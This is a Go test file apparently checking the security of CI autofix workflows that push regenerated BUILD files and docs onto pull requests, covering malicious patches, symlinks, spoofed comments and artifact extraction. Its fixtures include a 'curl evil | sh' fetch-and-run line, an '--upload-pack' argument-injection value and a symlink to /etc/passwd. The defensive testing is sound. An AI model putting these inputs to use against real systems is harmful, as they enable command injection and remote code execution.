				"rename from scripts/tool.sh\nrename to internal/newpkg/BUILD.bazel\n"),
		} {
			t.Run(name, func(t *testing.T) {
				res := r.runFlow(t, autofixFlow{script: noValidator, patch: patch})
				if res.err == nil && res.head != r.head {
					t.Fatalf("hostile rename pushed:\n%s", res.out)
				}
				unchanged(t, res, "REFUSED: staged change")
			})
		}
		// A mode change on an allowlisted file passes the path check; only the
		// mode arm of check_staged stops it.
		mode := r.patch(func() {
			if err := os.Chmod(filepath.Join(r.dir, "cmd/bd/BUILD.bazel"), 0o755); err != nil {
				t.Fatal(err)
			}
		})
		res := r.runFlow(t, autofixFlow{script: noValidator, patch: mode})
		if res.err == nil {
			t.Errorf("mode change not refused:\n%s", res.out)
		}
		unchanged(t, res, "REFUSED: staged change is not a regular-file edit")
	})

	// bazel.yml builds the PR merge commit, so main's own drift is in every
	// PR's patch. It must never be pushed onto a PR that did not cause it.
	t.Run("base-branch drift is not pushed to an unrelated PR", func(t *testing.T) {
		drift := r.patch(func() {
			r.write("other/BUILD.bazel", "go_library(name = \"other\", srcs = [\"other.go\"])\n")
			r.write("MODULE.bazel.lock", "{\"main\": 1}\n")
		})
		res := r.runFlow(t, flow(autofixFlow{patch: drift}))
		if res.err != nil {
			t.Fatalf("err=%v\n%s", res.err, res.out)
		}
		unchanged(t, res, "files this PR did not change")
	})

	t.Run("mixed drift pushes only the PR's packages", func(t *testing.T) {
		mixed := r.patch(func() {
			r.write("cmd/bd/BUILD.bazel", "go_library(name = \"bd\", srcs = [\"main.go\"])\n")
			r.write("other/BUILD.bazel", "go_library(name = \"other\", srcs = [\"other.go\"])\n")
			r.write("MODULE.bazel.lock", "{\"main\": 1}\n")
		})
		res := r.runFlow(t, flow(autofixFlow{patch: mixed}))
		if res.err != nil || res.head == r.head {
			t.Fatalf("err=%v head moved=%v\n%s", res.err, res.head != r.head, res.out)
		}
		if files := r.run("--git-dir="+res.remote, "diff", "--name-only", r.head, res.head); files != "cmd/bd/BUILD.bazel\n" {
			t.Errorf("pushed commit touches %q, want only cmd/bd/BUILD.bazel", files)
		}
		if !strings.Contains(res.log, "other/BUILD.bazel") || !strings.Contains(res.log, "MODULE.bazel.lock") {
			t.Errorf("comment does not list the files left alone:\n%s", res.log)
		}
	})

	// Every path outside a package walks up to the root; only root-level Go
	// and build inputs make root BUILD.bazel drift the PR's.
	t.Run("root package attribution", func(t *testing.T) {
		rootDrift := r.patch(func() {
			r.write("BUILD.bazel", "# root\ngo_library(name = \"beads\")\n")
			r.write("other/BUILD.bazel", "go_library(name = \"other\", srcs = [\"other.go\"])\n")
		})
		for name, edit := range map[string]func(r *autofixRepo){
			"docs only":      func(r *autofixRepo) { r.write("docs/guide.md", "# guide v2\n") },
			"README only":    func(r *autofixRepo) { r.write("README.md", "# beads v2\n") },
			"workflow only":  func(r *autofixRepo) { r.write(".github/workflows/ci.yml", "name: CI2\n") },
			"new docs tree":  func(r *autofixRepo) { r.write("docs/new/page.md", "# new\n") },
			"non-Go at root": func(r *autofixRepo) { r.write("Makefile", "all:\n") },
		} {
			t.Run(name, func(t *testing.T) {
				head := r.commitOn(r.base, "root-"+strings.ReplaceAll(name, " ", "-"), name, edit)
				// rootDrift touches only files this head shares with r.head.
				res := r.runFlow(t, flow(autofixFlow{headSHA: head, patch: rootDrift}))
				if res.err != nil || res.head != head {
					t.Fatalf("err=%v; pushed main's root drift onto a %s PR:\n%s\n%s", res.err, name, res.out, res.log)
				}
				if !strings.Contains(res.log, "files this PR did not change") {
					t.Errorf("want the not-this-PR comment:\n%s\n%s", res.out, res.log)
				}
			})
		}
		goHead := r.commitOn(r.base, "root-go", "root go", func(r *autofixRepo) { r.write("beads.go", "package beads // v2\n") })
		res := r.runFlow(t, flow(autofixFlow{headSHA: goHead, patch: rootDrift}))
		if res.err != nil || res.head == goHead {
			t.Fatalf("err=%v; root Go change did not get its root BUILD.bazel:\n%s\n%s", res.err, res.out, res.log)
		}
		if files := r.run("--git-dir="+res.remote, "diff", "--name-only", goHead, res.head); files != "BUILD.bazel\n" {
			t.Errorf("pushed commit touches %q, want only BUILD.bazel", files)
		}
	})

	t.Run("module files are pushed when the PR changed go.mod", func(t *testing.T) {
		gomod := r.variant("gomod", func(r *autofixRepo) { r.write("go.mod", "module example.com/beads\n\nrequire x v1\n") })
		lock := writeRawPatch(t, "diff --git a/MODULE.bazel.lock b/MODULE.bazel.lock\nindex 0967ef4..ab1ba8b 100644\n--- a/MODULE.bazel.lock\n+++ b/MODULE.bazel.lock\n@@ -1 +1 @@\n-{}\n+{\"x\": 1}\n")
		res := r.runFlow(t, flow(autofixFlow{headSHA: gomod, patch: lock}))
		if res.err != nil || res.head == gomod {
			t.Fatalf("err=%v\n%s\n%s", res.err, res.out, res.log)
		}
		if files := r.run("--git-dir="+res.remote, "diff", "--name-only", gomod, res.head); files != "MODULE.bazel.lock\n" {
			t.Errorf("pushed commit touches %q", files)
		}
	})

	// The branch was force-pushed back to an ancestor after the run: a plain
	// push would fast-forward and resurrect the dropped head.
	t.Run("push is leased to the run's head", func(t *testing.T) {
		res := r.runFlow(t, flow(autofixFlow{remoteAt: r.base}))
		if res.err != nil {
			t.Fatalf("err=%v\n%s", res.err, res.out)
		}
		if res.head != r.base {
			t.Errorf("branch = %s, want it left at %s (lease should refuse)", res.head, r.base)
		}
		if !strings.Contains(res.log, "pushing the fix to feature/x failed") {
			t.Errorf("want the push-failed recipe:\n%s\n%s", res.out, res.log)
		}
	})

	// A PR head with symlinks at or above an allowlisted path: nothing is
	// written to disk, and git refuses to stage through the link.
	t.Run("symlinked PR tree", func(t *testing.T) {
		symDir := r.variant("symdir", func(r *autofixRepo) {
			r.run("rm", "-rq", "internal/newpkg")
			if err := os.MkdirAll(filepath.Join(r.dir, "internal"), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink("../.github/workflows", filepath.Join(r.dir, "internal", "newpkg")); err != nil {
				t.Fatal(err)
			}
			// Sync tooling change: every patch file counts as the PR's, so
			// only git's own guard stands between the patch and the link.
			r.write("tools/bazel/go_srcs.py", "# touched\n")
		})
		symFile := r.variant("symfile", func(r *autofixRepo) {
			r.run("rm", "-q", "cmd/bd/BUILD.bazel")
			if err := os.Symlink("../../.github/workflows/ci.yml", filepath.Join(r.dir, "cmd", "bd", "BUILD.bazel")); err != nil {
				t.Fatal(err)
			}
		})
		newInLink := writeRawPatch(t, "diff --git a/internal/newpkg/BUILD.bazel b/internal/newpkg/BUILD.bazel\n"+
			"new file mode 100644\nindex 0000000..9daeafb\n--- /dev/null\n+++ b/internal/newpkg/BUILD.bazel\n@@ -0,0 +1 @@\n+test\n")
		editLink := r.patch(func() { r.write("cmd/bd/BUILD.bazel", "go_library(name = \"bd\", srcs = [\"main.go\"])\n") })
		for name, f := range map[string]autofixFlow{
			"new file under a symlinked dir": {headSHA: symDir, patch: newInLink},
			"edit of a symlinked file":       {headSHA: symFile, patch: editLink},
		} {
			t.Run(name, func(t *testing.T) {
				res := r.runFlow(t, flow(f))
				if res.head != f.headSHA {
					t.Fatalf("pushed through a symlink (err=%v):\n%s", res.err, res.out)
				}
				if !strings.Contains(res.log, "no longer applies cleanly") {
					t.Errorf("want the does-not-apply recipe:\n%s\n%s", res.out, res.log)
				}
			})
		}
	})
}

func TestDocsAutofixPushFlow(t *testing.T) {
	r := newDocsAutofixRepo(t)
	good := r.patch(func() {
		r.write("docs/CLI_REFERENCE.md", "# CLI\n\nnew flag\n")
		r.write("docs/cli-reference/bd-new.md", "# new\n")
	})
	flow := func(f autofixFlow) autofixFlow {
		f.script = docsAutofixPushScript
		if f.patch == "" {
			f.patch = good
		}
		return f
	}

	t.Run("same-repo PR gets the regen commit", func(t *testing.T) {
		res := r.runFlow(t, flow(autofixFlow{}))
		if res.err != nil || res.head == r.head {
			t.Fatalf("err=%v\n%s\n%s", res.err, res.out, res.log)
		}
		if files := r.run("--git-dir="+res.remote, "diff", "--name-only", r.head, res.head); files != "docs/CLI_REFERENCE.md\ndocs/cli-reference/bd-new.md\n" {
			t.Errorf("pushed commit touches %q", files)
		}
		if !strings.Contains(res.log, "<!-- cli-docs-autofix -->") || !strings.Contains(res.log, "Pushed `") {
			t.Errorf("want a pushed-commit comment:\n%s", res.log)
		}
	})

	// The reviewer's bypass, which pushed "docs: auto-regenerate CLI
	// reference" renaming scripts.sh on main: refused up front now, and by
	// the staged check alone.
	rename := r.patch(func() { r.run("mv", "scripts.sh", "docs/cli-reference/x.md") })
	legacy := writeRawPatch(t, "diff --git a/scripts.sh b/docs/cli-reference/x.md\nrename old scripts.sh\nrename new docs/cli-reference/x.md\n")
	for name, script := range map[string]string{"validator": docsAutofixPushScript, "staged check alone": withoutValidator(t, docsAutofixPushScript)} {
		for pname, patch := range map[string]string{"rename": rename, "legacy rename": legacy} {
			t.Run(name+"/"+pname, func(t *testing.T) {
				res := r.runFlow(t, autofixFlow{script: script, patch: patch})
				if res.err == nil || res.head != r.head || !strings.Contains(res.out, "REFUSED") {
					t.Errorf("err=%v head moved=%v\n%s\n%s", res.err, res.head != r.head, res.out, res.log)
				}
			})
		}
	}

	t.Run("spoofed comment is not edited", func(t *testing.T) {
		spoof := `[{"id":5,"user":{"login":"mallory"},"body":"<!-- cli-docs-autofix -->"}]`
		res := r.runFlow(t, flow(autofixFlow{headRepo: "someone/beads", env: []string{"FAKE_COMMENTS=" + spoof}}))
		if res.err != nil || strings.Contains(res.log, "--method PATCH") || !strings.Contains(res.log, "--method POST") {
			t.Errorf("err=%v:\n%s", res.err, res.log)
		}
	})

	t.Run("protected head branch is never pushed", func(t *testing.T) {
		res := r.runFlow(t, flow(autofixFlow{env: []string{`FAKE_RULES=[{"type": "update"}]`}}))
		if res.err != nil || res.head != r.head || !strings.Contains(res.log, "protected from bot pushes") {
			t.Errorf("err=%v head moved=%v\n%s", res.err, res.head != r.head, res.log)
		}
	})

	t.Run("push is leased to the run's head", func(t *testing.T) {
		res := r.runFlow(t, flow(autofixFlow{remoteAt: r.base}))
		if res.err != nil || res.head != r.base || !strings.Contains(res.log, "failed") {
			t.Errorf("err=%v head=%s\n%s\n%s", res.err, res.head, res.out, res.log)
		}
	})

	t.Run("staged check alone refuses a mode change", func(t *testing.T) {
		mode := r.patch(func() {
			if err := os.Chmod(filepath.Join(r.dir, "docs/docs.json"), 0o755); err != nil {
				t.Fatal(err)
			}
		})
		res := r.runFlow(t, autofixFlow{script: withoutValidator(t, docsAutofixPushScript), patch: mode})
		if res.err == nil || res.head != r.head || !strings.Contains(res.out, "REFUSED: staged change is not a regular-file edit") {
			t.Errorf("err=%v head moved=%v\n%s", res.err, res.head != r.head, res.out)
		}
	})

	t.Run("circuit breaker reads the fetched commit and fails closed", func(t *testing.T) {
		botHead := r.commitOn(r.head, "docs-bot", "docs: auto-regenerate CLI reference", func(r *autofixRepo) {
			r.write("docs/docs.json", "{\"regen\": 1}\n")
		})
		noSubject := scriptWith(t, docsAutofixPushScript, `HEAD_SUBJECT="$(git_ log -1 --format=%s "$HEAD_SHA")"`, `HEAD_SUBJECT="$(false)"`)
		for name, f := range map[string]autofixFlow{
			"bot head":           flow(autofixFlow{headSHA: botHead}),
			"subject unreadable": {script: noSubject, patch: good, headSHA: r.head},
		} {
			t.Run(name, func(t *testing.T) {
				res := r.runFlow(t, f)
				if res.err != nil || res.head != f.headSHA || !strings.Contains(res.log, "previous auto-regeneration commit left the docs stale") {
					t.Errorf("err=%v head moved=%v\n%s\n%s", res.err, res.head != f.headSHA, res.out, res.log)
				}
				if strings.Contains(res.log, "/commits/") {
					t.Errorf("head subject read through the API:\n%s", res.log)
				}
			})
		}
	})

	t.Run("ambiguous PR is skipped", func(t *testing.T) {
		two := "[" + pullJSON(7, "feature/x", r.head, "owner/beads", "main", "owner/beads") + "," +
			pullJSON(8, "feature/x", r.head, "owner/beads", "release/x", "owner/beads") + "]"
		res := r.runFlow(t, flow(autofixFlow{pulls: two}))
		if res.err != nil || res.head != r.head || strings.Contains(res.log, "--method") || !strings.Contains(res.out, "not guessing") {
			t.Errorf("err=%v head moved=%v\n%s\n%s", res.err, res.head != r.head, res.out, res.log)
		}
	})

	t.Run("HEAD_SHA must be 40 hex", func(t *testing.T) {
		for _, bad := range []string{"HEAD", r.head[:12], strings.ToUpper(r.head), "--upload-pack=touch /tmp/pwned"} {
			res := r.runFlow(t, flow(autofixFlow{env: []string{"HEAD_SHA=" + bad}}))
			if res.err == nil || !strings.Contains(res.out, "HEAD_SHA is not a commit id") || res.log != "" || res.head != r.head {
				t.Errorf("HEAD_SHA=%q: err=%v gh log=%q\n%s", bad, res.err, res.log, res.out)
			}
		}
	})
}

// git apply --summary is the validator's third layer: with the header greps
// switched off, it alone refuses every rename, copy, mode change and
// non-100644 creation (an allowlisted target keeps numstat quiet). A mode on
// a plain "index A..B MODE" line is not a change, so --summary does not list
// it; the index grep and check_staged cover that shape.
func TestAutofixPushSummaryLayer(t *testing.T) {
	for script, target := range map[string]string{
		bazelAutofixPushScript: "foo/BUILD.bazel",
		docsAutofixPushScript:  "docs/cli-reference/x.md",
	} {
		t.Run(filepath.Base(script), func(t *testing.T) {
			dir := t.TempDir()
			copyPath := summaryOnly(t, script)
			hunk := "--- a/" + target + "\n+++ b/" + target + "\n@@ -1 +1 @@\n-x\n+y\n"
			for name, body := range map[string]string{
				"rename":          "diff --git a/scripts.sh b/" + target + "\nsimilarity index 90%\nrename from scripts.sh\nrename to " + target + "\n",
				"legacy rename":   "diff --git a/scripts.sh b/" + target + "\nrename old scripts.sh\nrename new " + target + "\n",
				"copy":            "diff --git a/scripts.sh b/" + target + "\ncopy from scripts.sh\ncopy to " + target + "\n",
				"mode change":     "diff --git a/" + target + " b/" + target + "\nold mode 100644\nnew mode 100755\n",
				"mode with hunk":  "diff --git a/" + target + " b/" + target + "\nold mode 100644\nnew mode 100755\nindex 1234567..89abcde\n" + hunk,
				"executable file": "diff --git a/" + target + " b/" + target + "\nnew file mode 100755\nindex 0000000..e69de29\n--- /dev/null\n+++ b/" + target + "\n@@ -0,0 +1 @@\n+x\n",
				"symlink":         "diff --git a/" + target + " b/" + target + "\nnew file mode 120000\nindex 0000000..1234567\n--- /dev/null\n+++ b/" + target + "\n@@ -0,0 +1 @@\n+../scripts.sh\n\\ No newline at end of file\n",
				"delete symlink":  "diff --git a/" + target + " b/" + target + "\ndeleted file mode 120000\nindex 1234567..0000000\n--- a/" + target + "\n+++ /dev/null\n@@ -1 +0,0 @@\n-../scripts.sh\n\\ No newline at end of file\n",
			} {
				t.Run(name, func(t *testing.T) {
					out, err := runAutofixCheck(t, copyPath, dir, writeRawPatch(t, body))
					if err == nil || !strings.Contains(out, "REFUSED") {
						t.Errorf("--summary layer let it through (err=%v):\n%s\n--- patch ---\n%s", err, out, body)
					}
				})
			}
			// The layer still passes a plain regular-file edit and creation.
			plain := "diff --git a/" + target + " b/" + target + "\nnew file mode 100644\nindex 0000000..e69de29\n--- /dev/null\n+++ b/" + target + "\n@@ -0,0 +1 @@\n+x\n"
			if out, err := runAutofixCheck(t, copyPath, dir, writeRawPatch(t, plain)); err != nil {
				t.Errorf("plain creation refused: %v\n%s", err, out)
			}
		})
	}
}

// The download step of each autofix workflow, run as written against a fake
// gh: it lists artifacts of the triggering run only (the event's run id,
// never a repo-wide listing another run could win), extracts only its named
// files, and refuses an entry that is not a regular file.
func TestAutofixWorkflowDownloadStep(t *testing.T) {
	requireHostTool(t, "unzip")
	requireHostTool(t, "jq")
	for _, tc := range []struct {
		workflow, step, artifact, dir string
		files                         []string
	}{
		{bazelAutofixWorkflowName, "Download BUILD sync patch (if any)", "bazel-sync-patch", "bazel-patch", []string{"bazel-sync-meta.txt", "bazel-sync.patch"}},
		{"docs-autofix.yml", "Download docs freshness patch (if any)", "cli-docs-freshness-patch", "docs-patch", []string{"cli-docs-freshness.patch"}},
	} {
		t.Run(tc.workflow, func(t *testing.T) {
			step := readCIWorkflow(t, tc.workflow).job(t, "autofix").step(t, tc.step)
			if got := step.Env["RUN_ID"]; got != "${{ github.event.workflow_run.id }}" {
				t.Errorf("RUN_ID = %q, want the triggering run's id", got)
			}
			if !strings.Contains(step.Run, `"repos/${GITHUB_REPOSITORY}/actions/runs/${RUN_ID}/artifacts`) {
				t.Errorf("artifact listing is not scoped to the triggering run:\n%s", step.Run)
			}
			run := func(t *testing.T, entries map[string]string, symlinks map[string]string, listed string) (string, string, string, error) {
				t.Helper()
				tmp := t.TempDir()
				zipPath := filepath.Join(tmp, "a.zip")
				writeZip(t, zipPath, entries, symlinks)
				bin := t.TempDir()
				fake := `#!/usr/bin/env bash
set -euo pipefail
echo "gh $*" >> "$FAKE_GH_LOG"
jq_expr="" path=""
while [ $# -gt 0 ]; do
  case "$1" in
    api | --paginate) ;;
    --jq) jq_expr="$2"; shift ;;
    *) path="$1" ;;
  esac
  shift
done
case "$path" in
  repos/owner/beads/actions/runs/42/artifacts | "repos/owner/beads/actions/runs/42/artifacts?"*)
    printf '%s' "$FAKE_ARTIFACTS" | jq -r "$jq_expr" ;;
  repos/owner/beads/actions/artifacts/5/zip) cat "$FAKE_ZIP" ;;
  *) echo "gh: HTTP 404 for $path" >&2; exit 1 ;;
esac
`
				if err := os.WriteFile(filepath.Join(bin, "gh"), []byte(fake), 0o755); err != nil {
					t.Fatal(err)
				}
				runner := filepath.Join(tmp, "runner")
				workspace := filepath.Join(tmp, "workspace")
				for _, d := range []string{runner, workspace} {
					if err := os.MkdirAll(d, 0o755); err != nil {
						t.Fatal(err)
					}
				}
				output := filepath.Join(tmp, "output")
				log := filepath.Join(tmp, "gh.log")
				cmd := exec.Command("bash", "-e", "-c", step.Run)
				cmd.Dir = workspace
				cmd.Env = append(os.Environ(),
					"PATH="+bin+string(os.PathListSeparator)+os.Getenv("PATH"),
					"GITHUB_REPOSITORY=owner/beads", "RUNNER_TEMP="+runner, "GITHUB_OUTPUT="+output,
					"RUN_ID=42", "GH_TOKEN=x", "FAKE_GH_LOG="+log, "FAKE_ZIP="+zipPath,
					"FAKE_ARTIFACTS="+listed)
				out, err := cmd.CombinedOutput()
				if ws, _ := os.ReadDir(workspace); len(ws) != 0 {
					t.Errorf("the step wrote into the workspace: %v", ws)
				}
				outputs, _ := os.ReadFile(output)
				return string(out), string(outputs), filepath.Join(runner, tc.dir), err
			}
			listed := `{"artifacts":[{"id":6,"name":"other"},{"id":5,"name":"` + tc.artifact + `"}]}`

			t.Run("extracts only the named files", func(t *testing.T) {
				entries := map[string]string{
					"evil.sh":                  "curl evil | sh\n",
					".github/workflows/x.yml":  "on: push\n",
					"scripts/docs-autofix.sh":  "evil\n",
					"sub/" + tc.files[0]:       "nested\n",
					"cli-docs-freshness.patch": "docs\n",
					"bazel-sync.patch":         "bazel\n",
					"bazel-sync-meta.txt":      "pr=7\n",
				}
				out, outputs, dir, err := run(t, entries, nil, listed)
				if err != nil || !strings.Contains(outputs, "found=true") {
					t.Fatalf("err=%v outputs=%q\n%s", err, outputs, out)
				}
				ents, _ := os.ReadDir(dir)
				var got []string
				for _, e := range ents {
					got = append(got, e.Name())
					if !e.Type().IsRegular() {
						t.Errorf("%s is not a regular file", e.Name())
					}
				}
				if strings.Join(got, ",") != strings.Join(tc.files, ",") {
					t.Errorf("extracted %v, want exactly %v", got, tc.files)
				}
			})

			for _, name := range tc.files {
				t.Run("symlinked "+name+" is refused", func(t *testing.T) {
					entries := map[string]string{}
					for _, f := range tc.files {
						if f != name {
							entries[f] = "x\n"
						}
					}
					out, outputs, _, err := run(t, entries, map[string]string{name: "/etc/passwd"}, listed)
					if err == nil || strings.Contains(outputs, "found=true") || !strings.Contains(out, "is not a regular file") {
						t.Errorf("err=%v outputs=%q\n%s", err, outputs, out)
					}
				})
			}

			t.Run("no artifact on the run", func(t *testing.T) {
				out, outputs, _, err := run(t, map[string]string{tc.files[0]: "x\n"}, nil, `{"artifacts":[{"id":5,"name":"other"}]}`)
				if err != nil || !strings.Contains(outputs, "found=false") {
					t.Errorf("err=%v outputs=%q\n%s", err, outputs, out)
				}
			})
		})
	}
}

// writeZip writes a zip with regular entries and Unix symlink entries
// (name -> target), as unzip restores them.
func writeZip(t *testing.T, path string, entries, symlinks map[string]string) {
	t.Helper()
	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	zw := zip.NewWriter(f)
	add := func(name, body string, mode os.FileMode) {
		hdr := &zip.FileHeader{Name: name, Method: zip.Store}
		hdr.SetMode(mode)
		w, err := zw.CreateHeader(hdr)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	for name, body := range entries {
		add(name, body, 0o644)
	}
	for name, target := range symlinks {
		add(name, target, os.ModeSymlink|0o777)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := f.Close(); err != nil {
		t.Fatal(err)
	}
}
